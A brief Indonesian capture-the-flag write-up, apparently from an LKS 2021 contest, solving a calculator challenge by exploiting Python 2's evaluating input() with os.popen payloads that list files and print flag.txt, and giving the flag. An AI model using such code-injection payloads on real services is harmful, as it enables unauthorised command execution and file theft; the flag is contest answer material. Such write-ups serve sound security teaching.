## Judul Soal
Ai-chan

## Deskripsi Soal

> Pusing berhitung? tenang saja Ai-chan akan membantumu

---
## Penjelasan Penyelesaian Soal

- rce pada input python 2
- input pada python 2 dapat mengevaluasi kode python
- masukkan payload untuk menjalankan RCE
- kita bisa memasukkan `__import__('os')` untuk menggantikan `import os`
- `__import__('os').popen('ls').read()`
- setelah itu akan ada file flag.txt
- `__import__('os').popen('cat flag.txt').read()`

## Flag
LKS2021{thanks_for_calling_me_back}